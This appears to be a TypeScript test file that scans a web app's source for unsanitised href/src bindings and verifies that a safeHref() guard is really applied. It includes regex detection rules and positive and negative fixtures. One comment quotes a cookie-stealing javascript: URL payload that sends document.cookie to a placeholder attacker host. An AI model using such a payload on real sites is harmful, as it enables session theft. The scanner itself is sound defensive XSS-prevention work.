/**
 * Tree-wide scanner for URL-bearing attribute bindings.
 *
 * MOTIVATION. Fixing the two `href=${...}` bindings that an audit happened to
 * trace is a checklist. A checklist does not stop the next binding someone adds.
 * When the hazard is open-set, the fix has to be a chokepoint: this scanner
 * fails the build for ANY dynamic `href`/`src` binding, or any `.href`/`.src`
 * property assignment, that is not explicitly allow-listed here with a reason.
 *
 * To add a new URL-bearing binding you must either route it through
 * `safeHref()` or add an entry below justifying why it is safe by construction.
 *
 * SCOPE NOTE. The addendum to this task asked for this rule to be added to
 * `web/src/util/markdown.test.ts`, which has a tree-wide `BANNED_SINKS`
 * scanner. That file does not exist at this commit -- it lives only on the
 * `markdown-sanitize` branch, which has not merged. Verified: `BANNED_SINKS`
 * has zero occurrences in this tree. So this rule ships as its own
 * self-contained file, which also means it lands independently of that branch.
 * Folding the two scanners together is merge-time cleanup.
 *
 * (An earlier version of this note also said "the only other `*.test.ts` under
 * `web/` is `src/utils/task-ready.test.ts`". That was true when written and is
 * not now -- there are four. It is deleted rather than updated: a count of
 * sibling test files is not this file's business to track, and a fact nobody
 * maintains is how the sentence became false. scripts/run-tests.mjs discovers
 * them, which is the only place the set needs to be known.)
 */
import { existsSync, readdirSync, readFileSync, statSync } from 'node:fs';
import { dirname, join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { assert } from './assertions.js';

// ── the rules ────────────────────────────────────────────────────────────────

interface Rule {
  readonly name: string;
  readonly pattern: RegExp;
}

const RULES: readonly Rule[] = [
  // Lit template binding, unquoted: <a href=${expr}> / <img src=${expr}>
  { name: 'dynamic href/src attribute binding', pattern: /\b(?:href|src|xlink:href)\s*=\s*\$\{/ },
  // The same binding with quotes around it: href="${expr}". Lit accepts this
  // form and it is what most people write from muscle memory, but the unquoted
  // pattern above does not match it, so the scanner had a recall hole wide
  // enough to drive the original defect straight back through.
  {
    name: 'dynamic href/src attribute binding (quoted)',
    pattern: /\b(?:href|src|xlink:href)\s*=\s*["'`][^"'`]*\$\{/,
  },
  // Imperative DOM assignment: el.href = expr
  { name: 'dynamic href/src property assignment', pattern: /\.(?:href|src)\s*=\s*(?!=)/ },
  // Imperative attribute write: el.setAttribute('href', expr). This bypasses
  // both patterns above entirely and is the standard way to set an attribute
  // outside a template.
  {
    name: 'href/src written via setAttribute',
    pattern: /\.setAttribute(?:NS)?\s*\([^)]*["'](?:href|src|xlink:href)["']/i,
  },
];

// ── the allow-list ───────────────────────────────────────────────────────────

interface Allowed {
  /** Path relative to web/src. */
  readonly file: string;
  /** Exact trimmed source line that is permitted. */
  readonly line: string;
  /** Why this binding cannot carry an attacker-controlled scheme. */
  readonly reason: string;
  /**
   * If set, the interpolated identifier on THIS line must be initialised from
   * `safeHref(...)` and from nothing else, inside the innermost block enclosing
   * this line.
   *
   * Three successively tighter versions, each fixing a measured fail-open:
   *
   *   1. "the file imports safeHref somewhere" -- satisfied by a file that
   *      guards one binding and leaves the next one bare.
   *   2. "some line in the enclosing block matches `id = safeHref(`" -- where
   *      the block was the whole class, so a guarded method laundered a bare
   *      sibling, and where the match was a prefix, so
   *      `safeHref(url) || url` passed.
   *   3. what is checked now. See enclosingBlock and assignsFromSafeHref.
   */
  readonly viaSafeHref?: boolean;
}

const ALLOWED: readonly Allowed[] = [
  {
    file: 'components/inspector/ft-inspector-code.ts',
    line: 'return html`<a class="pr-link" href=${href} target="_blank" rel="noopener">${id}</a>`;',
    reason: 'href comes from safeHref(), which allow-lists http/https.',
    viaSafeHref: true,
  },
  {
    file: 'components/inspector/ft-inspector-meta.ts',
    line: 'return html`<a href=${href} target="_blank" rel="noopener" class="external-source-link">',
    reason: 'href comes from safeHref(), which allow-lists http/https.',
    viaSafeHref: true,
  },
  {
    file: 'components/ft-toolbar.ts',
    line: '<a href=${url} target="_blank" rel="noopener" class="external-link" title="View on GitHub">',
    reason:
      'url is built from the literal prefix https://github.com/ plus a remoteId ' +
      'already matched against GITHUB_REPO_RE, so the scheme is not attacker-controlled.',
  },
  {
    file: 'components/ft-toolbar.ts',
    line: 'a.href = url;',
    reason: 'url is a locally minted blob: URL from URL.createObjectURL, for a download.',
  },
];

// ── scanning ─────────────────────────────────────────────────────────────────

/**
 * Resolve web/src. This test is compiled into .tmp-test/ before running, so
 * import.meta.url points at the build output rather than at the sources. Walk up
 * to the directory holding package.json and take src/ from there.
 */
function sourceRoot(): string {
  let dir = fileURLToPath(new URL('.', import.meta.url));
  while (!existsSync(join(dir, 'package.json'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate web/package.json from ' + import.meta.url);
    dir = parent;
  }
  return join(dir, 'src');
}

const SRC = sourceRoot();

function sourceFiles(dir: string, out: string[] = []): string[] {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) {
      sourceFiles(full, out);
    } else if (entry.endsWith('.ts') && !entry.endsWith('.test.ts')) {
      out.push(full);
    }
  }
  return out;
}

interface Finding {
  readonly file: string;
  readonly lineNo: number;
  readonly line: string;
  readonly rule: string;
}

function scanText(file: string, text: string): Finding[] {
  const findings: Finding[] = [];
  text.split('\n').forEach((line, i) => {
    for (const rule of RULES) {
      if (rule.pattern.test(line)) {
        findings.push({ file, lineNo: i + 1, line: line.trim(), rule: rule.name });
      }
    }
  });
  return findings;
}

// ── assertions ───────────────────────────────────────────────────────────────

/**
 * Blanks out `//` and block comments, and the contents of ordinary quoted
 * strings, so brace counting and guard matching see code rather than prose.
 *
 * Characters are replaced with spaces rather than deleted, so every line keeps
 * its length and every line keeps its index -- callers index back into the
 * original text by line number.
 *
 * Template literals are deliberately left intact: their `${...}` braces balance,
 * and the guarded bindings live inside them. The residual risk is a lone `{` or
 * `}` in template HTML text, which would skew the depth count. Nothing in this
 * tree has one; a future one would widen or narrow a block rather than silently
 * approve a binding, and the anchored initialiser check below is what actually
 * decides approval.
 */
function blankNonCode(text: string): string {
  const out = text.split('');
  let i = 0;
  while (i < out.length) {
    const c = text[i]!;
    const next = text[i + 1];
    if (c === '/' && next === '/') {
      while (i < out.length && text[i] !== '\n') out[i++] = ' ';
    } else if (c === '/' && next === '*') {
      out[i++] = ' ';
      out[i++] = ' ';
      while (i < out.length && !(text[i] === '*' && text[i + 1] === '/')) {
        if (text[i] !== '\n') out[i] = ' ';
        i++;
      }
      if (i < out.length) {
        out[i++] = ' ';
        out[i++] = ' ';
      }
    } else if (c === '"' || c === "'") {
      i++;
      while (i < out.length && text[i] !== c && text[i] !== '\n') {
        if (text[i] === '\\') out[i++] = ' ';
        out[i] = ' ';
        i++;
      }
      i++;
    } else {
      i++;
    }
  }
  return out.join('');
}

/**
 * The innermost block enclosing a 1-based line number, found by brace depth.
 *
 * WHAT THIS REPLACED, AND WHY. The previous version took "the last preceding
 * line that starts at column 0 and opens a block" to "the first following line
 * that is a closing brace at column 0", and its comment said: "for a line inside
 * a class it widens to the whole class. Widening is the safe direction -- it can
 * only make the check more permissive than intended, never wrongly fail a
 * guarded binding".
 *
 * The first sentence was a correct measurement. The second was the wrong
 * conclusion drawn from it. For a SECURITY check, more permissive IS the failure
 * mode: the check exists to prove that THIS binding is guarded, and a scope that
 * spans the whole class lets a guarded sibling method launder a bare one.
 * Measured against the real scanner (deliverable D1(b)): a probe Lit class with
 * a guarded method and an unguarded sibling passed with exit 0; de-guarding the
 * sibling as a control made it fail. "Safe direction" was a sentence written
 * above a measurement that said the opposite.
 *
 * So: walk back from the binding accumulating brace depth and stop at depth -1,
 * which is the brace that opens the innermost enclosing block; then walk forward
 * to its match. For a method in a class that is the method, not the class.
 */
function enclosingBlock(lines: readonly string[], lineNo: number): readonly string[] {
  const text = lines.join('\n');
  const code = blankNonCode(text);

  // Character offsets of the binding line within `text`.
  let lineStart = 0;
  for (let i = 0; i < lineNo - 1; i++) lineStart += lines[i]!.length + 1;
  const lineEnd = lineStart + (lines[lineNo - 1]?.length ?? 0);

  // Back to the opening brace of the innermost enclosing block.
  let depth = 0;
  let open = 0;
  for (let i = lineStart - 1; i >= 0; i--) {
    const c = code[i];
    if (c === '}') depth++;
    else if (c === '{') {
      if (depth === 0) {
        open = i;
        break;
      }
      depth--;
    }
  }

  // Forward to its match.
  depth = 0;
  let close = code.length;
  for (let i = lineEnd; i < code.length; i++) {
    const c = code[i];
    if (c === '{') depth++;
    else if (c === '}') {
      if (depth === 0) {
        close = i;
        break;
      }
      depth--;
    }
  }

  return text.slice(open, close + 1).split('\n');
}

/**
 * Whether `line` assigns `id` from safeHref() AND FROM NOTHING ELSE.
 *
 * WHAT THIS REPLACED, AND WHY. The check used to be the regex
 * `\b<id>\s*=\s*safeHref\s*\(`, described as "the identifier is assigned from
 * safeHref(...) inside the same enclosing block". It tests only that the
 * initialiser BEGINS with a safeHref call. Measured against the real scanner
 * (deliverable D1(a)): rewriting the guarded site as
 *
 *     const href = safeHref(url) || url || undefined;
 *
 * keeps the scanner green (exit 0, "url-binding-scan: ok") while safe-url.test.ts
 * fails on a live `<a href="javascript:fetch('//attacker/'+document.cookie)">`.
 * The guard is completely defeated and the guard-checker approves it.
 *
 * So the whole initialiser is checked, not its prefix: parentheses are balanced
 * to find the end of the safeHref call, and what follows must be nothing but
 * terminators. `|| url`, `?? url`, `+ suffix`, a ternary -- anything that can
 * reintroduce the unvalidated value -- fails.
 */
function assignsFromSafeHref(line: string, id: string): boolean {
  // Not `.href =` (a property write), not `==`/`===`/`=>`.
  const lhs = new RegExp(`(?:^|[^\\w$.])${id}\\s*=(?![=>])\\s*`);
  const m = lhs.exec(line);
  if (!m) return false;

  const rhs = line.slice(m.index + m[0].length);
  const call = /^safeHref\s*\(/.exec(rhs);
  if (!call) return false;

  // Balance the call's parentheses.
  let depth = 0;
  let end = -1;
  for (let i = call[0].length - 1; i < rhs.length; i++) {
    if (rhs[i] === '(') depth++;
    else if (rhs[i] === ')') {
      depth--;
      if (depth === 0) {
        end = i;
        break;
      }
    }
  }
  if (end < 0) return false;

  // Nothing may follow but statement terminators.
  return /^[\s;,)]*$/.test(rhs.slice(end + 1));
}

/**
 * The identifier interpolated into a binding, e.g. `href` from
 * `<a href=${href} ...>`. Returns undefined for anything that is not a bare
 * identifier -- a call, a member expression, a template -- because those cannot
 * be traced back to an assignment by text matching and must not be silently
 * treated as guarded.
 */
function interpolatedIdentifier(line: string): string | undefined {
  const m = /\b(?:href|src|xlink:href)\s*=\s*["'`]?\s*\$\{\s*([A-Za-z_$][\w$]*)\s*\}/.exec(line);
  return m?.[1];
}

/**
 * MUST 3e: a detection pattern with no fixture proving it fires is itself the
 * defect it is meant to catch. These fixtures run through the same matcher the
 * tree scan uses.
 */
function testPositiveFixtures(): void {
  const shouldFire: ReadonlyArray<readonly [string, string]> = [
    ['plain lit href binding', 'return html`<a href=${this.description}>x</a>`;'],
    ['plain lit src binding', 'return html`<img src=${task.avatarUrl}>`;'],
    ['spaced href binding', 'html`<a href = ${raw}>x</a>`'],
    ['href binding wrapped in a call', 'html`<a href=${safeHref(raw)}>x</a>`'],
    ['imperative href assignment', 'anchor.href = attackerControlled;'],
    ['imperative src assignment', 'img.src = attackerControlled;'],
    ['iframe src binding', 'html`<iframe src=${embedUrl}></iframe>`'],
    // Recall gaps found by review. Each of these shipped past the scanner.
    ['double-quoted href binding', 'html`<a href="${raw}">x</a>`'],
    ['single-quoted src binding', "html`<img src='${raw}'>`"],
    ['quoted href with a prefix', 'html`<a href="${base}/issues/${n}">x</a>`'],
    ['setAttribute href', "anchor.setAttribute('href', attackerControlled);"],
    ['setAttribute src double quoted', 'img.setAttribute("src", attackerControlled);'],
    ['setAttributeNS xlink href', "use.setAttributeNS(XLINK, 'xlink:href', raw);"],
    ['svg xlink href binding', 'svg`<use xlink:href=${raw} />`'],
  ];
  for (const [name, fixture] of shouldFire) {
    const findings = scanText('fixture.ts', fixture);
    assert(findings.length > 0, `positive fixture "${name}" did not fire: ${fixture}`);
  }

  const shouldNotFire: ReadonlyArray<readonly [string, string]> = [
    ['static href', 'html`<a href="/docs">docs</a>`'],
    ['static src', '<script src="/src/index.ts"></script>'],
    ['href comparison', 'if (a.href === b.href) return;'],
    ['unrelated interpolation', 'html`<sl-badge variant=${v}>x</sl-badge>`'],
    ['reading location.href', 'const url = new URL(window.location.href);'],
    // Guards against the new rules over-firing. A data-* attribute that merely
    // contains the substring "href" is not an href.
    ['data attribute containing href', "el.setAttribute('data-href', raw);"],
    ['quoted static href', 'html`<a href="/docs/index">x</a>`'],
    ['getAttribute href', "const h = el.getAttribute('href');"],
    ['removeAttribute href', "el.removeAttribute('href');"],
  ];
  for (const [name, fixture] of shouldNotFire) {
    const findings = scanText('fixture.ts', fixture);
    assert(
      findings.length === 0,
      `negative fixture "${name}" fired unexpectedly (${findings.map((f) => f.rule).join(', ')}): ${fixture}`,
    );
  }
}

/**
 * Fixtures for the two guard-tracing mechanisms, which have their own recall
 * and precision to prove. Both replaced a mechanism that measured something
 * true and concluded something false, so both get direct fixtures rather than
 * relying on the tree scan to exercise them.
 */
function testGuardTracing(): void {
  const guarded: ReadonlyArray<readonly [string, string]> = [
    ['plain const', 'const href = safeHref(url);'],
    ['let', 'let href = safeHref(url);'],
    ['reassignment', 'href = safeHref(this.task.remoteUrl);'],
    ['nested parens in the argument', 'const href = safeHref(pick(a, (b) => b.url));'],
    ['trailing whitespace', 'const href = safeHref(url) ;'],
  ];
  for (const [name, fixture] of guarded) {
    assert(assignsFromSafeHref(fixture, 'href'), `guarded fixture "${name}" was rejected: ${fixture}`);
  }

  const notGuarded: ReadonlyArray<readonly [string, string]> = [
    // The D1(a) finding: each of these begins with a safeHref call and each
    // reinstates the unvalidated value. All five used to pass.
    ['|| fallback', 'const href = safeHref(url) || url;'],
    ['?? fallback', 'const href = safeHref(url) ?? url;'],
    ['chained fallback', 'const href = safeHref(url) || url || undefined;'],
    ['concatenation', "const href = safeHref(base) + '/' + path;"],
    ['ternary', 'const href = cond ? safeHref(url) : url;'],
    // Not a guard at all.
    ['bare assignment', 'const href = url;'],
    ['different identifier', 'const hrefRaw = safeHref(url);'],
    ['property write, not a local', 'el.href = safeHref(url);'],
    ['comparison', 'if (href === safeHref(url)) return;'],
    ['a different function', 'const href = maybeSafeHref(url);'],
  ];
  for (const [name, fixture] of notGuarded) {
    assert(
      !assignsFromSafeHref(fixture, 'href'),
      `fixture "${name}" was accepted as a guard but reinstates or never applies it: ${fixture}`,
    );
  }

  // A commented-out guard must not count. blankNonCode is what makes this true,
  // and it is applied to the block before matching.
  assert(
    !assignsFromSafeHref(blankNonCode('// const href = safeHref(url);'), 'href'),
    'a commented-out assignment was accepted as a guard',
  );
  assert(
    !assignsFromSafeHref(blankNonCode(' * e.g. `const href = safeHref(url);`'), 'href'),
    'a docblock example was accepted as a guard',
  );
  // Positive control for blankNonCode: it must not blank live code.
  assert(
    assignsFromSafeHref(blankNonCode('const href = safeHref(url); // guarded'), 'href'),
    'blankNonCode destroyed a real assignment; every rejection above would then be vacuous',
  );

  // The D1(b) finding: block scope must be the method, not the whole class.
  const classText = [
    'class Probe extends LitElement {', // 1
    '  renderGuarded() {', // 2
    '    const href = safeHref(this.a);', // 3
    '    return html`<a href=${href}>a</a>`;', // 4
    '  }', // 5
    '', // 6
    '  renderBare() {', // 7
    '    const href = this.b;', // 8
    '    return html`<a href=${href}>b</a>`;', // 9
    '  }', // 10
    '}', // 11
  ];
  const bareBlock = enclosingBlock(classText, 9);
  assert(
    !bareBlock.some((l) => assignsFromSafeHref(l, 'href')),
    'the enclosing block of an unguarded binding reached a sibling method\'s guard, ' +
      'so one guarded method would launder every bare binding in the class:\n' +
      bareBlock.join('\n'),
  );
  // Positive control: the guarded method's own block must still find its guard,
  // or the scoping is simply too tight and every viaSafeHref entry would fail.
  const guardedBlock = enclosingBlock(classText, 4);
  assert(
    guardedBlock.some((l) => assignsFromSafeHref(l, 'href')),
    'the enclosing block of a guarded binding lost its own guard:\n' + guardedBlock.join('\n'),
  );
}

function testNoUnapprovedBindings(): void {
  const files = sourceFiles(SRC);
  assert(files.length > 0, 'scanner found no source files -- the walk is broken');

  const findings: Finding[] = [];
  for (const file of files) {
    findings.push(...scanText(relative(SRC, file), readFileSync(file, 'utf8')));
  }

  // The scan must see the bindings we know exist; otherwise a silently broken
  // walk would report a clean tree.
  assert(
    findings.length >= ALLOWED.length,
    `scanner found ${findings.length} bindings but ${ALLOWED.length} are allow-listed; ` +
      'the walk or the patterns are broken',
  );

  const unapproved = findings.filter(
    (f) => !ALLOWED.some((a) => a.file === f.file && a.line === f.line),
  );

  assert(
    unapproved.length === 0,
    'Unapproved URL-bearing binding(s) found. Route the value through safeHref() ' +
      'from util/safe-url.js, or add an entry to ALLOWED with a justification:\n' +
      unapproved.map((f) => `  ${f.file}:${f.lineNo} [${f.rule}] ${f.line}`).join('\n'),
  );

  // Every allow-list entry must still correspond to real code, so entries do not
  // rot into permanent exemptions after the code they describe has moved -- and
  // to EXACTLY ONE line, so one approved line cannot launder a second identical
  // line pasted in beside it.
  //
  // (An audit finding asked for a line number on each entry instead. A pinned
  // line number churns on every edit above the binding and buys nothing once
  // uniqueness is enforced, so uniqueness is what is enforced; the real line
  // numbers are reported in the failure messages, where they are useful.)
  for (const a of ALLOWED) {
    const matches = findings.filter((f) => f.file === a.file && f.line === a.line);
    assert(
      matches.length > 0,
      `stale ALLOWED entry, no longer present in the tree: ${a.file} :: ${a.line}`,
    );
    assert(
      matches.length === 1,
      `ambiguous ALLOWED entry: ${a.file} :: ${a.line}\n` +
        `matches ${matches.length} lines (${matches.map((m) => m.lineNo).join(', ')}). ` +
        'One approval must not cover several bindings -- they can be reviewed ' +
        'separately and can diverge. Make the lines distinguishable, or route ' +
        'them all through safeHref().',
    );
  }

  // An allow-list entry claiming to go through safeHref must actually route THIS
  // binding through it, not merely import it somewhere in the file.
  for (const a of ALLOWED.filter((x) => x.viaSafeHref)) {
    const text = readFileSync(join(SRC, a.file), 'utf8');
    assert(
      text.includes("from '../../util/safe-url.js'") || text.includes("from '../util/safe-url.js'"),
      `${a.file} is allow-listed as using safeHref but does not import it`,
    );

    const lines = text.split('\n');
    const finding = findings.find((f) => f.file === a.file && f.line === a.line)!;
    const id = interpolatedIdentifier(a.line);
    assert(
      id !== undefined,
      `${a.file}:${finding.lineNo} is marked viaSafeHref but does not interpolate a bare ` +
        `identifier, so the guard cannot be traced: ${a.line}`,
    );

    // Comments are blanked before matching, so a commented-out assignment --
    // or the worked example in a docblock -- cannot stand in for a real guard.
    const block = enclosingBlock(lines, finding.lineNo).map((l) => blankNonCode(l));
    assert(
      block.some((l) => assignsFromSafeHref(l, id!)),
      `${a.file}:${finding.lineNo} is allow-listed as "href comes from safeHref()", but ` +
        `nothing in the enclosing block assigns ${id} from safeHref() AND NOTHING ELSE. ` +
        'The file importing safeHref is not enough -- a file can guard one binding and ' +
        'leave the next one bare. Neither is an initialiser that merely starts with a ' +
        `safeHref call: \`${id} = safeHref(x) || x\` reinstates the unvalidated value and ` +
        `used to pass here.\n  binding: ${a.line}`,
    );
  }
}

function run(): void {
  testPositiveFixtures();
  testGuardTracing();
  testNoUnapprovedBindings();
  console.log('url-binding-scan: ok');
}

run();
